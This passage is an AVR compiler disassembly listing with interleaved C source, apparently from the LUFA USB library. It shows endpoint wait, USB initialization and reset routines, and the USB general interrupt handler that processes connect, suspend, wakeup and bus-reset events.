    6aa6:	90 91 e5 00 	lds	r25, 0x00E5	; 0x8000e5 <__TEXT_REGION_LENGTH__+0x7e00e5>
		  return ENDPOINT_READYWAIT_EndpointStalled;

		uint16_t CurrentFrameNumber = USB_Device_GetFrameNumber();

		if (CurrentFrameNumber != PreviousFrameNumber)
    6aaa:	28 17       	cp	r18, r24
    6aac:	39 07       	cpc	r19, r25
    6aae:	f1 f2       	breq	.-68     	; 0x6a6c <Endpoint_WaitUntilReady+0x10>
		{
			PreviousFrameNumber = CurrentFrameNumber;

			if (!(TimeoutMSRem--))
    6ab0:	5f ef       	ldi	r21, 0xFF	; 255
    6ab2:	54 0f       	add	r21, r20
    6ab4:	41 11       	cpse	r20, r1
    6ab6:	d8 cf       	rjmp	.-80     	; 0x6a68 <Endpoint_WaitUntilReady+0xc>
			  return ENDPOINT_READYWAIT_Timeout;
    6ab8:	84 e0       	ldi	r24, 0x04	; 4
    6aba:	08 95       	ret
	for (;;)
	{
		if (Endpoint_GetEndpointDirection() == ENDPOINT_DIR_IN)
		{
			if (Endpoint_IsINReady())
			  return ENDPOINT_READYWAIT_NoError;
    6abc:	80 e0       	ldi	r24, 0x00	; 0
    6abe:	08 95       	ret
		}
		else
		{
			if (Endpoint_IsOUTReceived())
			  return ENDPOINT_READYWAIT_NoError;
    6ac0:	80 e0       	ldi	r24, 0x00	; 0
    6ac2:	08 95       	ret
		}

		uint8_t USB_DeviceState_LCL = USB_DeviceState;

		if (USB_DeviceState_LCL == DEVICE_STATE_Unattached)
		  return ENDPOINT_READYWAIT_DeviceDisconnected;
    6ac4:	82 e0       	ldi	r24, 0x02	; 2
    6ac6:	08 95       	ret
		else if (USB_DeviceState_LCL == DEVICE_STATE_Suspended)
		  return ENDPOINT_READYWAIT_BusSuspended;
    6ac8:	83 e0       	ldi	r24, 0x03	; 3
    6aca:	08 95       	ret
		else if (Endpoint_IsStalled())
		  return ENDPOINT_READYWAIT_EndpointStalled;
    6acc:	81 e0       	ldi	r24, 0x01	; 1

			if (!(TimeoutMSRem--))
			  return ENDPOINT_READYWAIT_Timeout;
		}
	}
}
    6ace:	08 95       	ret

00006ad0 <USB_Init_Device>:

	#if defined(USB_CAN_BE_BOTH)
	USB_CurrentMode = USB_MODE_None;
	#endif

	USB_IsInitialized = false;
    6ad0:	cf 93       	push	r28
    6ad2:	df 93       	push	r29
    6ad4:	10 92 f3 0d 	sts	0x0DF3, r1	; 0x800df3 <USB_DeviceState>
    6ad8:	10 92 ef 0d 	sts	0x0DEF, r1	; 0x800def <USB_Device_ConfigurationNumber>
    6adc:	10 92 f1 0d 	sts	0x0DF1, r1	; 0x800df1 <USB_Device_RemoteWakeupEnabled>
    6ae0:	10 92 f0 0d 	sts	0x0DF0, r1	; 0x800df0 <USB_Device_CurrentlySelfPowered>
    6ae4:	c0 ee       	ldi	r28, 0xE0	; 224
    6ae6:	d0 e0       	ldi	r29, 0x00	; 0
    6ae8:	88 81       	ld	r24, Y
    6aea:	8b 7f       	andi	r24, 0xFB	; 251
    6aec:	88 83       	st	Y, r24
    6aee:	e8 ed       	ldi	r30, 0xD8	; 216
    6af0:	f0 e0       	ldi	r31, 0x00	; 0
    6af2:	80 81       	ld	r24, Z
    6af4:	81 60       	ori	r24, 0x01	; 1
    6af6:	80 83       	st	Z, r24
    6af8:	42 e0       	ldi	r20, 0x02	; 2
    6afa:	60 e0       	ldi	r22, 0x00	; 0
    6afc:	80 e0       	ldi	r24, 0x00	; 0
    6afe:	13 df       	rcall	.-474    	; 0x6926 <Endpoint_ConfigureEndpoint_Prv>
    6b00:	e1 ee       	ldi	r30, 0xE1	; 225
    6b02:	f0 e0       	ldi	r31, 0x00	; 0
    6b04:	80 81       	ld	r24, Z
    6b06:	8e 7f       	andi	r24, 0xFE	; 254
    6b08:	80 83       	st	Z, r24
    6b0a:	e2 ee       	ldi	r30, 0xE2	; 226
    6b0c:	f0 e0       	ldi	r31, 0x00	; 0
    6b0e:	80 81       	ld	r24, Z
    6b10:	81 60       	ori	r24, 0x01	; 1
    6b12:	80 83       	st	Z, r24
    6b14:	80 81       	ld	r24, Z
    6b16:	88 60       	ori	r24, 0x08	; 8
    6b18:	80 83       	st	Z, r24
    6b1a:	88 81       	ld	r24, Y
    6b1c:	8e 7f       	andi	r24, 0xFE	; 254
    6b1e:	88 83       	st	Y, r24
    6b20:	df 91       	pop	r29
    6b22:	cf 91       	pop	r28
    6b24:	08 95       	ret

00006b26 <USB_ResetInterface>:
}

void USB_ResetInterface(void)
{
    6b26:	cf 93       	push	r28
    6b28:	df 93       	push	r29
	#if defined(USB_CAN_BE_BOTH)
	bool UIDModeSelectEnabled = ((UHWCON & (1 << UIDE)) != 0);
	#endif

	USB_INT_DisableAllInterrupts();
    6b2a:	28 d0       	rcall	.+80     	; 0x6b7c <USB_INT_DisableAllInterrupts>
	USB_INT_ClearAllInterrupts();
    6b2c:	2f d0       	rcall	.+94     	; 0x6b8c <USB_INT_ClearAllInterrupts>
    6b2e:	c8 ed       	ldi	r28, 0xD8	; 216
			}

			static inline void USB_Controller_Reset(void) ATTR_ALWAYS_INLINE;
			static inline void USB_Controller_Reset(void)
			{
				USBCON &= ~(1 << USBE);
    6b30:	d0 e0       	ldi	r29, 0x00	; 0
    6b32:	88 81       	ld	r24, Y
    6b34:	8f 77       	andi	r24, 0x7F	; 127
    6b36:	88 83       	st	Y, r24
    6b38:	88 81       	ld	r24, Y
				USBCON |=  (1 << USBE);
    6b3a:	80 68       	ori	r24, 0x80	; 128
    6b3c:	88 83       	st	Y, r24
    6b3e:	88 81       	ld	r24, Y
			}

			static inline void USB_CLK_Unfreeze(void) ATTR_ALWAYS_INLINE;
			static inline void USB_CLK_Unfreeze(void)
			{
				USBCON &= ~(1 << FRZCLK);
    6b40:	8f 7d       	andi	r24, 0xDF	; 223
    6b42:	88 83       	st	Y, r24
    6b44:	e7 ed       	ldi	r30, 0xD7	; 215

	if (USB_CurrentMode == USB_MODE_Device)
	{
		#if defined(USB_CAN_BE_DEVICE)
		#if (defined(USB_SERIES_6_AVR) || defined(USB_SERIES_7_AVR))
		UHWCON |=  (1 << UIMOD);
    6b46:	f0 e0       	ldi	r31, 0x00	; 0
    6b48:	80 81       	ld	r24, Z
    6b4a:	80 68       	ori	r24, 0x80	; 128
    6b4c:	80 83       	st	Z, r24
			}

			static inline void USB_PLL_Off(void) ATTR_ALWAYS_INLINE;
			static inline void USB_PLL_Off(void)
			{
				PLLCSR = 0;
    6b4e:	19 bc       	out	0x29, r1	; 41
			#else
			USB_PLL_Off();
			#endif
		}

		USB_Init_Device();
    6b50:	bf df       	rcall	.-130    	; 0x6ad0 <USB_Init_Device>
    6b52:	88 81       	ld	r24, Y

			#if defined(USB_SERIES_4_AVR) || defined(USB_SERIES_6_AVR) || defined(USB_SERIES_7_AVR)
			static inline void USB_OTGPAD_On(void) ATTR_ALWAYS_INLINE;
			static inline void USB_OTGPAD_On(void)
			{
				USBCON |=  (1 << OTGPADE);
    6b54:	80 61       	ori	r24, 0x10	; 16
    6b56:	88 83       	st	Y, r24
    6b58:	df 91       	pop	r29
	}

	#if (defined(USB_SERIES_4_AVR) || defined(USB_SERIES_6_AVR) || defined(USB_SERIES_7_AVR))
	USB_OTGPAD_On();
	#endif
}
    6b5a:	cf 91       	pop	r28
    6b5c:	08 95       	ret

00006b5e <USB_Init>:
    6b5e:	e8 ed       	ldi	r30, 0xD8	; 216
			}

			static inline void USB_OTGPAD_Off(void) ATTR_ALWAYS_INLINE;
			static inline void USB_OTGPAD_Off(void)
			{
				USBCON &= ~(1 << OTGPADE);
    6b60:	f0 e0       	ldi	r31, 0x00	; 0
    6b62:	80 81       	ld	r24, Z
    6b64:	8f 7e       	andi	r24, 0xEF	; 239
    6b66:	80 83       	st	Z, r24

			static inline void USB_REG_On(void) ATTR_ALWAYS_INLINE;
			static inline void USB_REG_On(void)
			{
			#if defined(USB_SERIES_4_AVR) || defined(USB_SERIES_6_AVR) || defined(USB_SERIES_7_AVR)
				UHWCON |=  (1 << UVREGE);
    6b68:	e7 ed       	ldi	r30, 0xD7	; 215
    6b6a:	f0 e0       	ldi	r31, 0x00	; 0
    6b6c:	80 81       	ld	r24, Z
    6b6e:	81 60       	ori	r24, 0x01	; 1
    6b70:	80 83       	st	Z, r24
		UHWCON &= ~(1 << UIDE);
		USB_CurrentMode = Mode;
	}
	#endif

	USB_IsInitialized = true;
    6b72:	81 e0       	ldi	r24, 0x01	; 1
    6b74:	80 93 f2 0d 	sts	0x0DF2, r24	; 0x800df2 <USB_IsInitialized>

	USB_ResetInterface();
    6b78:	d6 cf       	rjmp	.-84     	; 0x6b26 <USB_ResetInterface>
    6b7a:	08 95       	ret

00006b7c <USB_INT_DisableAllInterrupts>:
#include "../USBInterrupt.h"

void USB_INT_DisableAllInterrupts(void)
{
	#if defined(USB_SERIES_6_AVR) || defined(USB_SERIES_7_AVR)
	USBCON &= ~((1 << VBUSTE) | (1 << IDTE));
    6b7c:	e8 ed       	ldi	r30, 0xD8	; 216
    6b7e:	f0 e0       	ldi	r31, 0x00	; 0
    6b80:	80 81       	ld	r24, Z
    6b82:	8c 7f       	andi	r24, 0xFC	; 252
    6b84:	80 83       	st	Z, r24
	#if defined(USB_CAN_BE_HOST)
	UHIEN   = 0;
	#endif

	#if defined(USB_CAN_BE_DEVICE)
	UDIEN   = 0;
    6b86:	10 92 e2 00 	sts	0x00E2, r1	; 0x8000e2 <__TEXT_REGION_LENGTH__+0x7e00e2>
    6b8a:	08 95       	ret

00006b8c <USB_INT_ClearAllInterrupts>:
}

void USB_INT_ClearAllInterrupts(void)
{
	#if defined(USB_SERIES_4_AVR) || defined(USB_SERIES_6_AVR) || defined(USB_SERIES_7_AVR)
	USBINT = 0;
    6b8c:	10 92 da 00 	sts	0x00DA, r1	; 0x8000da <__TEXT_REGION_LENGTH__+0x7e00da>
	#if defined(USB_CAN_BE_HOST)
	UHINT  = 0;
	#endif

	#if defined(USB_CAN_BE_DEVICE)
	UDINT  = 0;
    6b90:	10 92 e1 00 	sts	0x00E1, r1	; 0x8000e1 <__TEXT_REGION_LENGTH__+0x7e00e1>
    6b94:	08 95       	ret

00006b96 <__vector_10>:
	#endif
}

ISR(USB_GEN_vect, ISR_BLOCK)
{
    6b96:	1f 92       	push	r1
    6b98:	0f 92       	push	r0
    6b9a:	0f b6       	in	r0, 0x3f	; 63
    6b9c:	0f 92       	push	r0
    6b9e:	11 24       	eor	r1, r1
    6ba0:	0b b6       	in	r0, 0x3b	; 59
    6ba2:	0f 92       	push	r0
    6ba4:	2f 93       	push	r18
    6ba6:	3f 93       	push	r19
    6ba8:	4f 93       	push	r20
    6baa:	5f 93       	push	r21
    6bac:	6f 93       	push	r22
    6bae:	7f 93       	push	r23
    6bb0:	8f 93       	push	r24
    6bb2:	9f 93       	push	r25
    6bb4:	af 93       	push	r26
    6bb6:	bf 93       	push	r27
    6bb8:	ef 93       	push	r30
    6bba:	ff 93       	push	r31
					case USB_INT_SUSPI:
						return (UDINT  & (1 << SUSPI));
					case USB_INT_EORSTI:
						return (UDINT  & (1 << EORSTI));
					case USB_INT_SOFI:
						return (UDINT  & (1 << SOFI));
    6bbc:	80 91 e1 00 	lds	r24, 0x00E1	; 0x8000e1 <__TEXT_REGION_LENGTH__+0x7e00e1>
	#if defined(USB_CAN_BE_DEVICE)
	#if !defined(NO_SOF_EVENTS)
	if (USB_INT_HasOccurred(USB_INT_SOFI) && USB_INT_IsEnabled(USB_INT_SOFI))
    6bc0:	82 ff       	sbrs	r24, 2
    6bc2:	0b c0       	rjmp	.+22     	; 0x6bda <__vector_10+0x44>
					case USB_INT_SUSPI:
						return (UDIEN  & (1 << SUSPE));
					case USB_INT_EORSTI:
						return (UDIEN  & (1 << EORSTE));
					case USB_INT_SOFI:
						return (UDIEN  & (1 << SOFE));
    6bc4:	80 91 e2 00 	lds	r24, 0x00E2	; 0x8000e2 <__TEXT_REGION_LENGTH__+0x7e00e2>
    6bc8:	82 ff       	sbrs	r24, 2
    6bca:	07 c0       	rjmp	.+14     	; 0x6bda <__vector_10+0x44>
						break;
					case USB_INT_EORSTI:
						UDINT  &= ~(1 << EORSTI);
						break;
					case USB_INT_SOFI:
						UDINT  &= ~(1 << SOFI);
    6bcc:	e1 ee       	ldi	r30, 0xE1	; 225
    6bce:	f0 e0       	ldi	r31, 0x00	; 0
    6bd0:	80 81       	ld	r24, Z
    6bd2:	8b 7f       	andi	r24, 0xFB	; 251
    6bd4:	80 83       	st	Z, r24
	{
		USB_INT_Clear(USB_INT_SOFI);

		EVENT_USB_Device_StartOfFrame();
    6bd6:	0e 94 50 1d 	call	0x3aa0	; 0x3aa0 <EVENT_USB_Device_StartOfFrame>
			{
				switch (Interrupt)
				{
					#if (defined(USB_SERIES_4_AVR) || defined(USB_SERIES_6_AVR) || defined(USB_SERIES_7_AVR))
					case USB_INT_VBUSTI:
						return (USBINT & (1 << VBUSTI));
    6bda:	80 91 da 00 	lds	r24, 0x00DA	; 0x8000da <__TEXT_REGION_LENGTH__+0x7e00da>
	}
	#endif

	#if defined(USB_SERIES_4_AVR) || defined(USB_SERIES_6_AVR) || defined(USB_SERIES_7_AVR)
	if (USB_INT_HasOccurred(USB_INT_VBUSTI) && USB_INT_IsEnabled(USB_INT_VBUSTI))
    6bde:	80 ff       	sbrs	r24, 0
    6be0:	1f c0       	rjmp	.+62     	; 0x6c20 <__vector_10+0x8a>
			{
				switch (Interrupt)
				{
					#if (defined(USB_SERIES_4_AVR) || defined(USB_SERIES_6_AVR) || defined(USB_SERIES_7_AVR))
					case USB_INT_VBUSTI:
						return (USBCON & (1 << VBUSTE));
    6be2:	80 91 d8 00 	lds	r24, 0x00D8	; 0x8000d8 <__TEXT_REGION_LENGTH__+0x7e00d8>
    6be6:	80 ff       	sbrs	r24, 0
    6be8:	1b c0       	rjmp	.+54     	; 0x6c20 <__vector_10+0x8a>
			{
				switch (Interrupt)
				{
					#if (defined(USB_SERIES_4_AVR) || defined(USB_SERIES_6_AVR) || defined(USB_SERIES_7_AVR))
					case USB_INT_VBUSTI:
						USBINT &= ~(1 << VBUSTI);
    6bea:	ea ed       	ldi	r30, 0xDA	; 218
    6bec:	f0 e0       	ldi	r31, 0x00	; 0
    6bee:	80 81       	ld	r24, Z
    6bf0:	8e 7f       	andi	r24, 0xFE	; 254
    6bf2:	80 83       	st	Z, r24
				 *  \return Boolean \c true if the VBUS line is currently detecting power from a host, \c false otherwise.
				 */
				static inline bool USB_VBUS_GetStatus(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
				static inline bool USB_VBUS_GetStatus(void)
				{
					return ((USBSTA & (1 << VBUS)) ? true : false);
    6bf4:	80 91 d9 00 	lds	r24, 0x00D9	; 0x8000d9 <__TEXT_REGION_LENGTH__+0x7e00d9>
	{
		USB_INT_Clear(USB_INT_VBUSTI);

		if (USB_VBUS_GetStatus())
    6bf8:	80 ff       	sbrs	r24, 0
    6bfa:	0d c0       	rjmp	.+26     	; 0x6c16 <__vector_10+0x80>

		/* Inline Functions: */
			static inline void USB_PLL_On(void) ATTR_ALWAYS_INLINE;
			static inline void USB_PLL_On(void)
			{
				PLLCSR = USB_PLL_PSC;
    6bfc:	84 e1       	ldi	r24, 0x14	; 20
    6bfe:	89 bd       	out	0x29, r24	; 41
				PLLCSR = (USB_PLL_PSC | (1 << PLLE));
    6c00:	86 e1       	ldi	r24, 0x16	; 22
    6c02:	89 bd       	out	0x29, r24	; 41
		{
			if (!(USB_Options & USB_OPT_MANUAL_PLL))
			{
				USB_PLL_On();
				while (!(USB_PLL_IsReady()));
    6c04:	09 b4       	in	r0, 0x29	; 41
    6c06:	00 fe       	sbrs	r0, 0
    6c08:	fd cf       	rjmp	.-6      	; 0x6c04 <__vector_10+0x6e>
			}

			USB_DeviceState = DEVICE_STATE_Powered;
    6c0a:	81 e0       	ldi	r24, 0x01	; 1
    6c0c:	80 93 f3 0d 	sts	0x0DF3, r24	; 0x800df3 <USB_DeviceState>
			EVENT_USB_Device_Connect();
    6c10:	0e 94 e4 1c 	call	0x39c8	; 0x39c8 <EVENT_USB_Device_Connect>
    6c14:	05 c0       	rjmp	.+10     	; 0x6c20 <__vector_10+0x8a>
			}

			static inline void USB_PLL_Off(void) ATTR_ALWAYS_INLINE;
			static inline void USB_PLL_Off(void)
			{
				PLLCSR = 0;
    6c16:	19 bc       	out	0x29, r1	; 41
		else
		{
			if (!(USB_Options & USB_OPT_MANUAL_PLL))
			  USB_PLL_Off();

			USB_DeviceState = DEVICE_STATE_Unattached;
    6c18:	10 92 f3 0d 	sts	0x0DF3, r1	; 0x800df3 <USB_DeviceState>
			EVENT_USB_Device_Disconnect();
    6c1c:	0e 94 f1 1c 	call	0x39e2	; 0x39e2 <EVENT_USB_Device_Disconnect>
					#endif
					#if defined(USB_CAN_BE_DEVICE)
					case USB_INT_WAKEUPI:
						return (UDINT  & (1 << WAKEUPI));
					case USB_INT_SUSPI:
						return (UDINT  & (1 << SUSPI));
    6c20:	80 91 e1 00 	lds	r24, 0x00E1	; 0x8000e1 <__TEXT_REGION_LENGTH__+0x7e00e1>
		}
	}
	#endif

	if (USB_INT_HasOccurred(USB_INT_SUSPI) && USB_INT_IsEnabled(USB_INT_SUSPI))
    6c24:	80 ff       	sbrs	r24, 0
    6c26:	16 c0       	rjmp	.+44     	; 0x6c54 <__vector_10+0xbe>
					#endif
					#if defined(USB_CAN_BE_DEVICE)
					case USB_INT_WAKEUPI:
						return (UDIEN  & (1 << WAKEUPE));
					case USB_INT_SUSPI:
						return (UDIEN  & (1 << SUSPE));
    6c28:	80 91 e2 00 	lds	r24, 0x00E2	; 0x8000e2 <__TEXT_REGION_LENGTH__+0x7e00e2>
    6c2c:	80 ff       	sbrs	r24, 0
    6c2e:	12 c0       	rjmp	.+36     	; 0x6c54 <__vector_10+0xbe>
					#if defined(USB_CAN_BE_DEVICE)
					case USB_INT_WAKEUPI:
						UDIEN  &= ~(1 << WAKEUPE);
						break;
					case USB_INT_SUSPI:
						UDIEN  &= ~(1 << SUSPE);
    6c30:	e2 ee       	ldi	r30, 0xE2	; 226
    6c32:	f0 e0       	ldi	r31, 0x00	; 0
    6c34:	80 81       	ld	r24, Z
    6c36:	8e 7f       	andi	r24, 0xFE	; 254
    6c38:	80 83       	st	Z, r24
						USBCON |= (1 << IDTE);
						break;
					#endif
					#if defined(USB_CAN_BE_DEVICE)
					case USB_INT_WAKEUPI:
						UDIEN  |= (1 << WAKEUPE);
    6c3a:	80 81       	ld	r24, Z
    6c3c:	80 61       	ori	r24, 0x10	; 16
    6c3e:	80 83       	st	Z, r24
			#endif

			static inline void USB_CLK_Freeze(void) ATTR_ALWAYS_INLINE;
			static inline void USB_CLK_Freeze(void)
			{
				USBCON |=  (1 << FRZCLK);
    6c40:	e8 ed       	ldi	r30, 0xD8	; 216
    6c42:	f0 e0       	ldi	r31, 0x00	; 0
    6c44:	80 81       	ld	r24, Z
    6c46:	80 62       	ori	r24, 0x20	; 32
    6c48:	80 83       	st	Z, r24
			}

			static inline void USB_PLL_Off(void) ATTR_ALWAYS_INLINE;
			static inline void USB_PLL_Off(void)
			{
				PLLCSR = 0;
    6c4a:	19 bc       	out	0x29, r1	; 41

		#if defined(USB_SERIES_2_AVR) && !defined(NO_LIMITED_CONTROLLER_CONNECT)
		USB_DeviceState = DEVICE_STATE_Unattached;
		EVENT_USB_Device_Disconnect();
		#else
		USB_DeviceState = DEVICE_STATE_Suspended;
    6c4c:	85 e0       	ldi	r24, 0x05	; 5
    6c4e:	80 93 f3 0d 	sts	0x0DF3, r24	; 0x800df3 <USB_DeviceState>
		EVENT_USB_Device_Suspend();
    6c52:	6d d2       	rcall	.+1242   	; 0x712e <USB_Event_Stub>
					case USB_INT_IDTI:
						return (USBINT & (1 << IDTI));
					#endif
					#if defined(USB_CAN_BE_DEVICE)
					case USB_INT_WAKEUPI:
						return (UDINT  & (1 << WAKEUPI));
    6c54:	80 91 e1 00 	lds	r24, 0x00E1	; 0x8000e1 <__TEXT_REGION_LENGTH__+0x7e00e1>
		#endif
	}

	if (USB_INT_HasOccurred(USB_INT_WAKEUPI) && USB_INT_IsEnabled(USB_INT_WAKEUPI))
    6c58:	84 ff       	sbrs	r24, 4
    6c5a:	2f c0       	rjmp	.+94     	; 0x6cba <__vector_10+0x124>
					case USB_INT_IDTI:
						return (USBCON & (1 << IDTE));
					#endif
					#if defined(USB_CAN_BE_DEVICE)
					case USB_INT_WAKEUPI:
						return (UDIEN  & (1 << WAKEUPE));
    6c5c:	80 91 e2 00 	lds	r24, 0x00E2	; 0x8000e2 <__TEXT_REGION_LENGTH__+0x7e00e2>
    6c60:	84 ff       	sbrs	r24, 4
    6c62:	2b c0       	rjmp	.+86     	; 0x6cba <__vector_10+0x124>

		/* Inline Functions: */
			static inline void USB_PLL_On(void) ATTR_ALWAYS_INLINE;
			static inline void USB_PLL_On(void)
			{
				PLLCSR = USB_PLL_PSC;
    6c64:	84 e1       	ldi	r24, 0x14	; 20
    6c66:	89 bd       	out	0x29, r24	; 41
				PLLCSR = (USB_PLL_PSC | (1 << PLLE));
    6c68:	86 e1       	ldi	r24, 0x16	; 22
    6c6a:	89 bd       	out	0x29, r24	; 41
	{
		if (!(USB_Options & USB_OPT_MANUAL_PLL))
		{
			USB_PLL_On();
			while (!(USB_PLL_IsReady()));
    6c6c:	09 b4       	in	r0, 0x29	; 41
    6c6e:	00 fe       	sbrs	r0, 0
    6c70:	fd cf       	rjmp	.-6      	; 0x6c6c <__vector_10+0xd6>
			}

			static inline void USB_CLK_Unfreeze(void) ATTR_ALWAYS_INLINE;
			static inline void USB_CLK_Unfreeze(void)
			{
				USBCON &= ~(1 << FRZCLK);
    6c72:	e8 ed       	ldi	r30, 0xD8	; 216
    6c74:	f0 e0       	ldi	r31, 0x00	; 0
    6c76:	80 81       	ld	r24, Z
    6c78:	8f 7d       	andi	r24, 0xDF	; 223
    6c7a:	80 83       	st	Z, r24
						USBINT &= ~(1 << IDTI);
						break;
					#endif
					#if defined(USB_CAN_BE_DEVICE)
					case USB_INT_WAKEUPI:
						UDINT  &= ~(1 << WAKEUPI);
    6c7c:	e1 ee       	ldi	r30, 0xE1	; 225
    6c7e:	f0 e0       	ldi	r31, 0x00	; 0
    6c80:	80 81       	ld	r24, Z
    6c82:	8f 7e       	andi	r24, 0xEF	; 239
    6c84:	80 83       	st	Z, r24
						USBCON &= ~(1 << IDTE);
						break;
					#endif
					#if defined(USB_CAN_BE_DEVICE)
					case USB_INT_WAKEUPI:
						UDIEN  &= ~(1 << WAKEUPE);
    6c86:	e2 ee       	ldi	r30, 0xE2	; 226
    6c88:	f0 e0       	ldi	r31, 0x00	; 0
    6c8a:	80 81       	ld	r24, Z
    6c8c:	8f 7e       	andi	r24, 0xEF	; 239
    6c8e:	80 83       	st	Z, r24
					#if defined(USB_CAN_BE_DEVICE)
					case USB_INT_WAKEUPI:
						UDIEN  |= (1 << WAKEUPE);
						break;
					case USB_INT_SUSPI:
						UDIEN  |= (1 << SUSPE);
    6c90:	80 81       	ld	r24, Z
    6c92:	81 60       	ori	r24, 0x01	; 1
    6c94:	80 83       	st	Z, r24
		USB_INT_Clear(USB_INT_WAKEUPI);

		USB_INT_Disable(USB_INT_WAKEUPI);
		USB_INT_Enable(USB_INT_SUSPI);

		if (USB_Device_ConfigurationNumber)
    6c96:	80 91 ef 0d 	lds	r24, 0x0DEF	; 0x800def <USB_Device_ConfigurationNumber>
    6c9a:	88 23       	and	r24, r24
    6c9c:	21 f0       	breq	.+8      	; 0x6ca6 <__vector_10+0x110>
		  USB_DeviceState = DEVICE_STATE_Configured;
    6c9e:	84 e0       	ldi	r24, 0x04	; 4
    6ca0:	80 93 f3 0d 	sts	0x0DF3, r24	; 0x800df3 <USB_DeviceState>
    6ca4:	09 c0       	rjmp	.+18     	; 0x6cb8 <__vector_10+0x122>
			}

			static inline bool USB_Device_IsAddressSet(void) ATTR_ALWAYS_INLINE ATTR_WARN_UNUSED_RESULT;
			static inline bool USB_Device_IsAddressSet(void)
			{
				return (UDADDR & (1 << ADDEN));
    6ca6:	80 91 e3 00 	lds	r24, 0x00E3	; 0x8000e3 <__TEXT_REGION_LENGTH__+0x7e00e3>
		else
		  USB_DeviceState = (USB_Device_IsAddressSet()) ? DEVICE_STATE_Addressed : DEVICE_STATE_Powered;
    6caa:	88 23       	and	r24, r24
    6cac:	14 f4       	brge	.+4      	; 0x6cb2 <__vector_10+0x11c>
    6cae:	83 e0       	ldi	r24, 0x03	; 3
    6cb0:	01 c0       	rjmp	.+2      	; 0x6cb4 <__vector_10+0x11e>
    6cb2:	81 e0       	ldi	r24, 0x01	; 1
    6cb4:	80 93 f3 0d 	sts	0x0DF3, r24	; 0x800df3 <USB_DeviceState>

		#if defined(USB_SERIES_2_AVR) && !defined(NO_LIMITED_CONTROLLER_CONNECT)
		EVENT_USB_Device_Connect();
		#else
		EVENT_USB_Device_WakeUp();
    6cb8:	3a d2       	rcall	.+1140   	; 0x712e <USB_Event_Stub>
					case USB_INT_WAKEUPI:
						return (UDINT  & (1 << WAKEUPI));
					case USB_INT_SUSPI:
						return (UDINT  & (1 << SUSPI));
					case USB_INT_EORSTI:
						return (UDINT  & (1 << EORSTI));
    6cba:	80 91 e1 00 	lds	r24, 0x00E1	; 0x8000e1 <__TEXT_REGION_LENGTH__+0x7e00e1>
		#endif
	}

	if (USB_INT_HasOccurred(USB_INT_EORSTI) && USB_INT_IsEnabled(USB_INT_EORSTI))
    6cbe:	83 ff       	sbrs	r24, 3
    6cc0:	23 c0       	rjmp	.+70     	; 0x6d08 <__vector_10+0x172>
					case USB_INT_WAKEUPI:
						return (UDIEN  & (1 << WAKEUPE));
					case USB_INT_SUSPI:
						return (UDIEN  & (1 << SUSPE));
					case USB_INT_EORSTI:
						return (UDIEN  & (1 << EORSTE));
    6cc2:	80 91 e2 00 	lds	r24, 0x00E2	; 0x8000e2 <__TEXT_REGION_LENGTH__+0x7e00e2>
    6cc6:	83 ff       	sbrs	r24, 3
    6cc8:	1f c0       	rjmp	.+62     	; 0x6d08 <__vector_10+0x172>
						break;
					case USB_INT_SUSPI:
						UDINT  &= ~(1 << SUSPI);
						break;
					case USB_INT_EORSTI:
						UDINT  &= ~(1 << EORSTI);
    6cca:	e1 ee       	ldi	r30, 0xE1	; 225
    6ccc:	f0 e0       	ldi	r31, 0x00	; 0
    6cce:	80 81       	ld	r24, Z
    6cd0:	87 7f       	andi	r24, 0xF7	; 247
    6cd2:	80 83       	st	Z, r24
	{
		USB_INT_Clear(USB_INT_EORSTI);

		USB_DeviceState                = DEVICE_STATE_Default;
    6cd4:	82 e0       	ldi	r24, 0x02	; 2
    6cd6:	80 93 f3 0d 	sts	0x0DF3, r24	; 0x800df3 <USB_DeviceState>
		USB_Device_ConfigurationNumber = 0;
    6cda:	10 92 ef 0d 	sts	0x0DEF, r1	; 0x800def <USB_Device_ConfigurationNumber>
					#if defined(USB_CAN_BE_DEVICE)
					case USB_INT_WAKEUPI:
						UDINT  &= ~(1 << WAKEUPI);
						break;
					case USB_INT_SUSPI:
						UDINT  &= ~(1 << SUSPI);
    6cde:	80 81       	ld	r24, Z
    6ce0:	8e 7f       	andi	r24, 0xFE	; 254
    6ce2:	80 83       	st	Z, r24
					#if defined(USB_CAN_BE_DEVICE)
					case USB_INT_WAKEUPI:
						UDIEN  &= ~(1 << WAKEUPE);
						break;
					case USB_INT_SUSPI:
						UDIEN  &= ~(1 << SUSPE);
    6ce4:	e2 ee       	ldi	r30, 0xE2	; 226
    6ce6:	f0 e0       	ldi	r31, 0x00	; 0
    6ce8:	80 81       	ld	r24, Z
    6cea:	8e 7f       	andi	r24, 0xFE	; 254
    6cec:	80 83       	st	Z, r24
						USBCON |= (1 << IDTE);
						break;
					#endif
					#if defined(USB_CAN_BE_DEVICE)
					case USB_INT_WAKEUPI:
						UDIEN  |= (1 << WAKEUPE);
    6cee:	80 81       	ld	r24, Z
    6cf0:	80 61       	ori	r24, 0x10	; 16
    6cf2:	80 83       	st	Z, r24
				uint8_t Number = (Address & ENDPOINT_EPNUM_MASK);

				if (Number >= ENDPOINT_TOTAL_ENDPOINTS)
				  return false;

				return Endpoint_ConfigureEndpoint_Prv(Number,
    6cf4:	42 e0       	ldi	r20, 0x02	; 2
    6cf6:	60 e0       	ldi	r22, 0x00	; 0
    6cf8:	80 e0       	ldi	r24, 0x00	; 0
    6cfa:	15 de       	rcall	.-982    	; 0x6926 <Endpoint_ConfigureEndpoint_Prv>
						break;
					case USB_INT_SOFI:
						UDIEN  |= (1 << SOFE);
						break;
					case USB_INT_RXSTPI:
						UEIENX |= (1 << RXSTPE);
    6cfc:	e0 ef       	ldi	r30, 0xF0	; 240
    6cfe:	f0 e0       	ldi	r31, 0x00	; 0
    6d00:	80 81       	ld	r24, Z
    6d02:	88 60       	ori	r24, 0x08	; 8

		#if defined(INTERRUPT_CONTROL_ENDPOINT)
		USB_INT_Enable(USB_INT_RXSTPI);
		#endif

		EVENT_USB_Device_Reset();
    6d04:	80 83       	st	Z, r24
    6d06:	13 d2       	rcall	.+1062   	; 0x712e <USB_Event_Stub>
		USB_ResetInterface();

		EVENT_USB_UIDChange();
	}
	#endif
}
    6d08:	ff 91       	pop	r31
    6d0a:	ef 91       	pop	r30
    6d0c:	bf 91       	pop	r27
    6d0e:	af 91       	pop	r26
    6d10:	9f 91       	pop	r25
    6d12:	8f 91       	pop	r24
    6d14:	7f 91       	pop	r23
    6d16:	6f 91       	pop	r22
    6d18:	5f 91       	pop	r21
    6d1a:	4f 91       	pop	r20
    6d1c:	3f 91       	pop	r19
    6d1e:	2f 91       	pop	r18
